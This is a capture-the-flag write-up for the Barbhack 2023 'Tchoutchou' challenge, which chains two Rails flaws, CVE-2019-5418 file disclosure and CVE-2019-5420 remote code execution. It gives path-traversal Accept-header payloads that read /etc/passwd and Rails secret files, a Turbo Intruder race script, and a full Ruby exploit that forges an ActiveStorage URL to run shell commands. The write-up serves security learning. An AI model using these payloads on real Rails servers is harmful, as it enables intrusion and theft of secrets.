# Barbhack 2023 - Tchoutchou 🚅

**Category:** : Web - Hard
**Description:** : 


```
   OO O o o o...      ______________________ _________________
  O     ____          |                    | |               |
 ][_n_i_| (   ooo___  |       I LOVE       | |     CME <3    |
(__________|_[______]_|____________________|_|_______________|
  0--0--0      0  0      0       0     0        0        0
```

We are also provided the following files : 

```bash
/home/demoniac/myapp$ bundle install
/home/demoniac/myapp$ rails s -b 0.0.0.0 -e production
```

Flag is located in a random folder on /home/demoniac/xxxxxxx/flag.txt where xxxxxxxxx is a random string.

Crontab
```bash
# restart rails and regenerate rails credentails (it takes long time)
*/3 * * * * /home/demoniac/restart.sh
```

## Write Up 📝

### 1 - Understanding the challenge 🧠

The application itself, doesn't show anything beside this little train in ASCII. I tried to poke around but without any success first.  
After googling a bit on "Ruby On Rails" vulnerabilities, since we know that the application run with rails, we can quickly find this repository : [https://github.com/mpgn/Rails-doubletap-RCE ](https://github.com/mpgn/Rails-doubletap-RCE)

> Fun fact, MPGN is actually the creator of this challenge !

If you read the whole Github project, the attack is nicely explained : 

1. The exploit check if the Rails application is vulnerable to the *CVE-2019-5418*
2. Then gets the content of the files: `credentials.yml.enc` and `master.key`
3. Decrypt the credentials.yml.enc and get the secret_key_base value
4. Craft a request to the ressource `/rails/active_storage/disk/:encoded_key/*filename(.:format)` => CVE-2019-5420
5. Send the request to the vulnerable server
6. The code is executed on the server

### 2 - CVE-2019-5418 

The first step is to test if the application is vulnerable to CVE-2019-5418, which is a LFI via a specific crafted header, you can find a technical blog on this CVE here : [https://zhuzhuuu.com/pentesting-lab/2019-04/](https://zhuzhuuu.com/pentesting-lab/2019-04/)  
Let's test it on our challenge : 

![LFI /etc/passwd](https://raw.githubusercontent.com/YanZaX/writeups/master/barbhack-2023/TchouTchou/images/2023-08-28_20-33.png)

Okay it's a good start, we have our first step ! We can also note that the user `demoniac` is present on the server.

Following the methodology, I tried to retrieve the two files require for the next steps : `../../../../../../../../../../config/credentials.yml.enc{{` and `../../../../../../../../../../config/master.key{{`. 
However, I kept getting the response from my first request which *contains the result of the `/etc/passwd` file*. 

The difficulty on this challenge is the time, during a CTF time is precious but whenever you try to exploit the CVE, you will *break the cache* and return the same content until the docker restart (It's restarting every 3min).

After waiting peacefully 3 minutes, I was able to trigger my request but I didn't get the result I expected : 

![Error 500](https://raw.githubusercontent.com/YanZaX/writeups/master/barbhack-2023/TchouTchou/images/2023-08-28_21-01.png)

This is probably because I'm not hitting the file, the config folder is not at the root directory. I can only do 1 request every 3 minutes so it will take a lot of time to identify where the file is... unless I can use *wildcard*.
I found this small bash script that seems to be using wildcards : [ttps://gist.github.com/snyff/04c3463845480632a1fe192308c31439#file-race_condition-sh](https://gist.github.com/snyff/04c3463845480632a1fe192308c31439#file-race_condition-sh)
Let's tweak it for our need : `../../../../../../*/demoniac/*/config/master.key{{` and `../../../../../../*/demoniac/*/config/credentials.yml.enc{{` should work for us.

![Getting the first file](https://raw.githubusercontent.com/YanZaX/writeups/master/barbhack-2023/TchouTchou/images/2023-08-28_21-07.png)

Good ! However I cannot retrieve the second file `master.key` before the docker restart because the cache is poisoned and always returning the `credentials.yml.enc`... Moreover each time the docker restart, a new pair of `master.key` and `credentials.yml.enc` are generated.

### 3 - Exploiting the race condition

It looks like if you're fast enough, you can retrieve multiples files before the cache gets poisoned... However, I couldn't do it using `curl` it was not fast enough so we had to do it with Turbo Intruder.

The script looks like this : 

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, specify engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint='http://rail:3000',
                           concurrentConnections=1,
                           engine=Engine.BURP
                           )

    req1 = r'''GET /demo HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: ../../../../../../*/demoniac/*/config/credentials.yml.enc{{
X-Req: %s

'''

    req2 = r'''GET /demo HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: ../../../../../../*/demoniac/*/config/master.key{{
X-Req: %s

'''

    for i in range(1):
        engine.queue(req1, '1', gate='race1')
        engine.queue(req2, '2', gate='race1')

    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

![Race condition](https://raw.githubusercontent.com/YanZaX/writeups/master/barbhack-2023/TchouTchou/images/2023-08-28_21-13.png)

Good ! 🥳 we are able to retrieve the two files and we can jump to the next step.

### 4 - Decrypting the `credentials.yml.enc` with the `master.key`

To do that we can use the following code snippet :

```ruby
credentials = ActiveSupport::EncryptedConfiguration.new(
    config_path: creds_path,
    key_path: key_path,
    env_key: 'RAILS_MASTER_KEY',
    raise_if_missing_key: true
)
```

However we run into a lot of issue while trying to run the code snippet because it requires a lot of old dependencies that are not available anymore. To make things easier, I've created a docker with all the dependencies found in the initial POC : [https://github.com/mpgn/Rails-doubletap-RCE/blob/master/demo-5.2.1/Gemfile](https://github.com/mpgn/Rails-doubletap-RCE/blob/master/demo-5.2.1/Gemfile)

Dockerfile : 

```Dockerfile
FROM ruby:2.5.8-stretch
RUN echo "deb http://archive.debian.org/debian/ stretch main" > /etc/apt/sources.list \
    && echo "deb http://archive.debian.org/debian-security stretch/updates main" >> /etc/apt/sources.list
RUN apt-get update -qq && apt-get install -y curl && apt-get install -y nodejs && apt-get install -y vim
COPY Gemfile .
RUN bundle install
```

Gemfile : 

```Gemfile
source 'https://rubygems.org'
git_source(:github) { |repo| "https://github.com/#{repo}.git" }

ruby '2.5.1'

# Bundle edge Rails instead: gem 'rails', github: 'rails/rails'
gem 'rails', '= 5.2.1'
# Use sqlite3 as the database for Active Record
gem 'sqlite3', '~> 1.3.6'
# Use Puma as the app server
gem 'puma', '~> 3.11'
# Use SCSS for stylesheets
gem 'sass-rails', '~> 5.0'
# Use Uglifier as compressor for JavaScript assets
gem 'uglifier', '>= 1.3.0'
# See https://github.com/rails/execjs#readme for more supported runtimes
# gem 'mini_racer', platforms: :ruby

# Use CoffeeScript for .coffee assets and views
gem 'coffee-rails', '~> 4.2'
# Turbolinks makes navigating your web application faster. Read more: https://github.com/turbolinks/turbolinks
gem 'turbolinks', '~> 5'
# Build JSON APIs with ease. Read more: https://github.com/rails/jbuilder
gem 'jbuilder', '~> 2.5'
# Use Redis adapter to run Action Cable in production
# gem 'redis', '~> 4.0'
# Use ActiveModel has_secure_password
# gem 'bcrypt', '~> 3.1.7'

# Use ActiveStorage variant
# gem 'mini_magick', '~> 4.8'

# Use Capistrano for deployment
# gem 'capistrano-rails', group: :development

# Reduces boot times through caching; required in config/boot.rb
gem 'bootsnap', '>= 1.1.0', require: false

group :development, :test do
  # Call 'byebug' anywhere in the code to stop execution and get a debugger console
  gem 'byebug', platforms: [:mri, :mingw, :x64_mingw]
end

group :development do
  # Access an interactive console on exception pages or by calling 'console' anywhere in the code.
  gem 'web-console', '>= 3.3.0'
  gem 'listen', '>= 3.0.5', '< 3.2'
  # Spring speeds up development by keeping your application running in the background. Read more: https://github.com/rails/spring
  gem 'spring'
  gem 'spring-watcher-listen', '~> 2.0.0'
end

group :test do
  # Adds support for Capybara system testing and selenium driver
  gem 'capybara', '>= 2.15'
  gem 'selenium-webdriver'
  # Easy installation and use of chromedriver to run system tests with Chrome
  gem 'chromedriver-helper'
end

# Windows does not include zoneinfo files, so bundle the tzinfo-data gem
gem 'tzinfo-data', platforms: [:mingw, :mswin, :x64_mingw, :jruby]
```

And you make yourself at home 🏠 : `docker build -t old-ruby .` && `docker run -it old-ruby /bin/bash`
The process is not very smooth because we needed to copy paste the key & the credentials everytime but ruby is a pain 🥲 and we were in a rush but it worked !

![Decrypting the credentials](https://raw.githubusercontent.com/YanZaX/writeups/master/barbhack-2023/TchouTchou/images/2023-08-28_21-26.png)


> Copy/Pasting the key cost me some precious minutes... At first it didn't worked because of an hidden newline that I couldnt see on vim...

![Decrypting the credentials](https://raw.githubusercontent.com/YanZaX/writeups/master/barbhack-2023/TchouTchou/images/2023-08-28_21-31.png)


### 5 - Exploit CVE-2019-5420

Once this part is done, the rest is a piece of cake 🎂. We just need to send a request to a specific ressource containing our payload to trigger the RCE ! This part can be found on the initial POC from line 67 : [https://github.com/mpgn/Rails-doubletap-RCE/blob/master/exploit.rb](https://github.com/mpgn/Rails-doubletap-RCE/blob/master/exploit.rb)

Once it's done, you just need to visit the link to trigger the request. Here is how we did it (Please don't mind the dirty ruby script) :

```ruby
print "[+] Exploiting CVE-2019-5420 => "
command = "system('bash','-c','sleep 10')"  
command_b64 = Base64.encode64(command)
puts "command : #{command}"
secret_key_base = credentials.secret_key_base
key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
secret = key_generator.generate_key("ActiveStorage")
verifier = ActiveSupport::MessageVerifier.new(secret)
erb = ERB.allocate
erb.instance_variable_set :@src, command
erb.instance_variable_set :@filename, "1"
erb.instance_variable_set :@lineno, 1
dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
puts ""
url = $remote + "/rails/active_storage/disk/" + verifier.generate(dump_target, purpose: :blob_key) + "/test"
puts "\033[92mURL Generated : #{url}\033[0m"
puts ""

print "[+] Triggering the exploit => "
uri = URI(url)
http = Net::HTTP.new(uri.hostname, uri.port)
http.read_timeout = 10
req = Net::HTTP::Get.new(uri)
begin
    res = http.request(req)
rescue Net::ReadTimeout
    puts "\033[92m[WIN] The server slept : 10sec\033[0m"
else
    puts "Not working - #{res.code}"
    abort
end
```

And finally it worked : 

![Triggering the RCE](https://raw.githubusercontent.com/YanZaX/writeups/master/barbhack-2023/TchouTchou/images/2023-08-28_21-39.png)

We decided to first use a sleep because the cache is still poisoned (from the first request when we retrieve the keys), the docker where the challenge is run couldn't communicate with outside.

### 6 - Exfiltrate the flag

The last part was quite easy, instead of doing a sleep we modified the exploit to write the output of our commands in temporary file that we can retrieve with the LFI. The files are not removed after each restart so we just had to wait 3 minutes and retrieve our file.
We first ran the command : `system('bash','-c','ls > tmp/pwn.txt')` in order to find an hidden directory `ran0dom0_directoy_126` then we used to LFI to read the flag : 

![Flagged !](https://raw.githubusercontent.com/YanZaX/writeups/master/barbhack-2023/TchouTchou/images/2023-08-28_21-45.png)

### 7 - Ending words

Big thanks to [@Kuromatae](https://twitter.com/Kuromatae666) for spending hours on this challenge with me :> and also big thanks to the whole "senior" team `Gold Or Hack` : [@Agarri_FR](https://twitter.com/Agarri_FR), [@TheLaluka](https://twitter.com/TheLaluka), [@Gromak123_Sec](https://twitter.com/Gromak123_Sec), [@FreeSec](https://twitter.com/payothl), @drlno (I don't have your handle sorry 😬)

I failed last year on this challenge and lost of time and for this... I still hate [@mpgn](https://twitter.com/mpgn_x64) 😡


<details>
<summary>Full ruby script for part 4 to 6: </summary>

```ruby
require 'net/http'
require 'base64'
require 'rails'
require 'erb'


$remote = "http://rails.brb:5006"
$ressource = "/demo"

creds_path = "/root/credentials.yml.enc"
key_path =  "/root/master.key"


creds_path_sanitized = File.read(creds_path).chomp
File.open(creds_path, 'w') { |file| file.write(creds_path_sanitized) }

key_path_sanitized = File.read(key_path).chomp
File.open(key_path, 'w') { |file| file.write(key_path_sanitized) }

ENV['RAILS_MASTER_KEY'] = File.read('/root/master.key')

puts "Config: #{File.read(creds_path)}"
puts "Key : #{File.read(key_path)}"
puts "Config File Exists: #{File.exist?(creds_path)}"
puts "Key File Exists: #{File.exist?(key_path)}"
puts "RAILS_MASTER_KEY=#{ENV['RAILS_MASTER_KEY']}"
puts ""
print "[+] Decrypt secret_key_base => "

credentials = ActiveSupport::EncryptedConfiguration.new(
    config_path: creds_path,
    key_path: key_path,
    env_key: 'RAILS_MASTER_KEY',
    raise_if_missing_key: true
)

if credentials.secret_key_base != nil
    puts ""
    puts "\033[92mSecret Key Base: #{credentials.secret_key_base}\033[0m"
    puts ""
end

print "[+] Exploiting CVE-2019-5420 => "
command = "system('bash','-c','sleep 10')"  
command_b64 = Base64.encode64(command)
puts "command : #{command}"
secret_key_base = credentials.secret_key_base
key_generator = ActiveSupport::CachingKeyGenerator.new(ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000))
secret = key_generator.generate_key("ActiveStorage")
verifier = ActiveSupport::MessageVerifier.new(secret)
erb = ERB.allocate
erb.instance_variable_set :@src, command
erb.instance_variable_set :@filename, "1"
erb.instance_variable_set :@lineno, 1
dump_target  = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
puts ""
url = $remote + "/rails/active_storage/disk/" + verifier.generate(dump_target, purpose: :blob_key) + "/test"
puts "\033[92mURL Generated : #{url}\033[0m"
puts ""

print "[+] Triggering the exploit => "
uri = URI(url)
http = Net::HTTP.new(uri.hostname, uri.port)
http.read_timeout = 10
req = Net::HTTP::Get.new(uri)
begin
    res = http.request(req)
rescue Net::ReadTimeout
    puts "\033[92m[WIN] The server slept : 10sec\033[0m"
else
    puts "Not working - #{res.code}"
    abort
end
```
</details>